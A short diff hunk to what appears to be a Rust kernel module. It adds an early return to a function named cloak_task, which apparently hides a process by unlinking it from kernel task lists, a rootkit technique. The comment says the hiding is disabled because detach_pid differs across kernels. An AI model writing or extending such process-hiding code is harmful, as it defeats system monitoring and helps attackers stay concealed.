@@ -406,6 +406,14 @@ const PIDTYPE_TGID: c_int = 1;
 const PIDTYPE_MAX: usize = 4;
 
 pub fn cloak_task(task: *mut c_void) {
+    // detach_pid's arity differs across kernels (the classic detach_pid(task, type)
+    // versus the batched detach_pid(pids, task, type) paired with free_pids); calling
+    // the wrong one drives a UBSAN/CFI trap on hardened kernels. Leave the thread
+    // visible rather than risk it.
+    if true {
+        let _ = task;
+        return;
+    }
     let (Some(tasks), Some(sibling), Some(thread_node)) = (
         super::layout::field_offset("task_struct", "tasks"),
         super::layout::field_offset("task_struct", "sibling"),
